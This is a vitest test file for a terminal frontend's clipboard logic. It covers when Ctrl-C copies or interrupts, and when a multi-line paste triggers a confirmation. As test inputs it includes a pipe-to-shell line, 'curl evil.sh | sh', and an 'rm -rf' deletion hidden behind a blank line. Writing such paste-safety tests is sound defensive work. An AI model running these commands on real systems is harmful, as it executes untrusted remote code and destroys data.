/**
 * Guards what a keystroke means inside the terminal.
 *
 * The cost of getting this wrong is not a missing feature. Ctrl-C is how a
 * person stops a process that is filling their screen, and a rule that copies
 * when it should interrupt hands them a session they cannot get out of. The
 * backend keeps its input path alive under buffer pressure for that keystroke
 * alone, so the frontend has no business swallowing it by accident.
 */

import { describe, expect, it } from 'vitest';

import {
  keyIntent,
  pasteLines,
  pasteNeedsConfirming,
  preparePaste,
} from '../src/features/terminal/clipboard';

function key(
  code: string,
  held: Partial<Pick<KeyboardEvent, 'ctrlKey' | 'shiftKey' | 'altKey' | 'metaKey'>> = {},
  type = 'keydown',
): Pick<KeyboardEvent, 'type' | 'code' | 'ctrlKey' | 'shiftKey' | 'altKey' | 'metaKey'> {
  return {
    type,
    code,
    ctrlKey: held.ctrlKey ?? false,
    shiftKey: held.shiftKey ?? false,
    altKey: held.altKey ?? false,
    metaKey: held.metaKey ?? false,
  };
}

describe('Ctrl-C, where the conflict is', () => {
  it('copies when there is something selected', () => {
    expect(keyIntent(key('KeyC', { ctrlKey: true }), true, 'control')).toBe('copy');
  });

  it('interrupts when there is not', () => {
    expect(keyIntent(key('KeyC', { ctrlKey: true }), false, 'control')).toBe('send');
  });

  it('interrupts a flood, because a flood leaves nothing selected', () => {
    /* The scenario the backend comment in ssh/terminal.rs is about. Output is
       pouring in and the person needs out. They have no selection, so this is
       the interrupt, every time. */
    expect(keyIntent(key('KeyC', { ctrlKey: true }), false, 'control')).toBe('send');
  });
});

describe('the shortcuts that never have to choose', () => {
  it('copies on Ctrl-Shift-C whether or not anything is selected', () => {
    /* The way out for somebody who does not want Ctrl-C to ever be a copy.
       With no selection it copies nothing, which is what it should do. */
    expect(keyIntent(key('KeyC', { ctrlKey: true, shiftKey: true }), true, 'control')).toBe('copy');
    expect(keyIntent(key('KeyC', { ctrlKey: true, shiftKey: true }), false, 'control')).toBe('copy');
  });

  it('pastes on Ctrl-V and Ctrl-Shift-V', () => {
    /* Ctrl-V has nothing to collide with: it sends 0x16, which nobody types on
       purpose. */
    expect(keyIntent(key('KeyV', { ctrlKey: true }), false, 'control')).toBe('paste');
    expect(keyIntent(key('KeyV', { ctrlKey: true, shiftKey: true }), false, 'control')).toBe(
      'paste',
    );
  });
});

describe('what must reach the host untouched', () => {
  it('sends every key that is not C or V', () => {
    for (const code of ['KeyA', 'KeyD', 'KeyZ', 'Enter', 'Escape', 'Insert', 'KeyP']) {
      expect(keyIntent(key(code, { ctrlKey: true }), true, 'control'), code).toBe('send');
    }
  });

  it('ignores anything that is not a key going down', () => {
    /* xterm hands the handler keyup and keypress too. Acting on all three
       would copy once and paste twice. */
    expect(keyIntent(key('KeyC', { ctrlKey: true }, 'keyup'), true, 'control')).toBe('send');
    expect(keyIntent(key('KeyV', { ctrlKey: true }, 'keypress'), true, 'control')).toBe('send');
  });

  it('leaves AltGr combinations alone', () => {
    /* Windows reports AltGr as Ctrl and Alt together. Taking those would eat
       characters that layouts put behind AltGr-C and AltGr-V. */
    expect(keyIntent(key('KeyC', { ctrlKey: true, altKey: true }), true, 'control')).toBe('send');
    expect(keyIntent(key('KeyV', { ctrlKey: true, altKey: true }), false, 'control')).toBe('send');
  });

  it('leaves a bare C and V alone', () => {
    expect(keyIntent(key('KeyC'), true, 'control')).toBe('send');
    expect(keyIntent(key('KeyV'), false, 'control')).toBe('send');
  });
});

describe('a Mac, where the two keys are different keys', () => {
  it('copies and pastes on the command key', () => {
    expect(keyIntent(key('KeyC', { metaKey: true }), true, 'meta')).toBe('copy');
    expect(keyIntent(key('KeyV', { metaKey: true }), false, 'meta')).toBe('paste');
  });

  it('copies on Cmd-C with nothing selected, rather than sending anything', () => {
    expect(keyIntent(key('KeyC', { metaKey: true }), false, 'meta')).toBe('copy');
  });

  it('keeps Ctrl-C as the interrupt even with a selection', () => {
    /* The whole reason a Mac has no conflict to resolve. If Ctrl-C copied here
       too, the platform that did not have the problem would get it anyway. */
    expect(keyIntent(key('KeyC', { ctrlKey: true }), true, 'meta')).toBe('send');
  });

  it('takes neither when both modifiers are held', () => {
    expect(keyIntent(key('KeyC', { metaKey: true, ctrlKey: true }), true, 'meta')).toBe('send');
  });

  it('does not answer to the command key away from a Mac', () => {
    expect(keyIntent(key('KeyC', { metaKey: true }), true, 'control')).toBe('send');
  });
});

describe('when a paste has to be shown first', () => {
  it('says nothing about a paste the remote shell has bracketed', () => {
    /* Bracketed paste is the real fix. The shell asked for it, xterm wraps the
       text, and none of it is read as commands. Asking anyway would train
       people to click through the one prompt that matters. */
    expect(pasteNeedsConfirming('cd /tmp\ncurl evil.sh | sh\n', true, false)).toBe(false);
  });

  it('asks about more than one line when it has not', () => {
    expect(pasteNeedsConfirming('cd /tmp\ncurl evil.sh | sh', false, false)).toBe(true);
  });

  it('stays quiet for one command, however it ends', () => {
    /* Pasting a single command and expecting it to run is the ordinary case,
       and a trailing newline is part of it. */
    expect(pasteNeedsConfirming('ls -la', false, false)).toBe(false);
    expect(pasteNeedsConfirming('ls -la\n', false, false)).toBe(false);
    expect(pasteNeedsConfirming('ls -la\r\n', false, false)).toBe(false);
  });

  it('asks when the break is in the middle, whatever the line ending', () => {
    for (const text of ['a\nb', 'a\r\nb', 'a\rb']) {
      expect(pasteNeedsConfirming(text, false, false), JSON.stringify(text)).toBe(true);
    }
  });

  it('asks about a blank line hiding a second command', () => {
    /* The shape of the trick: it looks like one line and a bit of whitespace. */
    expect(pasteNeedsConfirming('echo safe\n\nrm -rf /tmp/x\n', false, false)).toBe(true);
  });

  it('asks about every paste that reaches more than one host', () => {
    /* Bracketed paste stops the shell running the lines. It stops nothing
       about the paste landing on four production machines because the wrong
       pane had focus, so one line under brackets still earns the question. */
    expect(pasteNeedsConfirming('ls -la', true, true)).toBe(true);
    expect(pasteNeedsConfirming('ls -la', false, true)).toBe(true);
  });

  it('still says nothing about pasting nothing', () => {
    expect(pasteNeedsConfirming('', true, true)).toBe(false);
  });
});

describe('what the confirmation shows', () => {
  it('lists the lines that are about to run', () => {
    expect(pasteLines('cd /tmp\ncurl evil.sh | sh\n')).toEqual(['cd /tmp', 'curl evil.sh | sh']);
  });

  it('keeps a blank line rather than tidying it away', () => {
    /* The blank line is part of what makes the paste look harmless. Hiding it
       from the person deciding would defeat the point of asking. */
    expect(pasteLines('echo safe\n\nrm -rf /tmp/x')).toEqual(['echo safe', '', 'rm -rf /tmp/x']);
  });

  it('handles one line with no break at all', () => {
    expect(pasteLines('ls -la')).toEqual(['ls -la']);
  });
});

describe('what a confirmed paste actually sends', () => {
  it('turns every newline into the byte Return sends', () => {
    /* A confirmed paste goes around xterm, so it has to do the normalising
       xterm would have done. Send line feeds instead and the shell reads a
       list of commands nobody asked it to run and runs none of them. */
    expect(preparePaste('one\ntwo\n')).toBe('one\rtwo\r');
  });

  it('collapses a Windows line ending to the same single byte', () => {
    expect(preparePaste('one\r\ntwo')).toBe('one\rtwo');
  });

  it('leaves a lone carriage return as it found it', () => {
    expect(preparePaste('one\rtwo')).toBe('one\rtwo');
  });

  it('changes nothing in a single line', () => {
    expect(preparePaste('ls -la')).toBe('ls -la');
  });
});
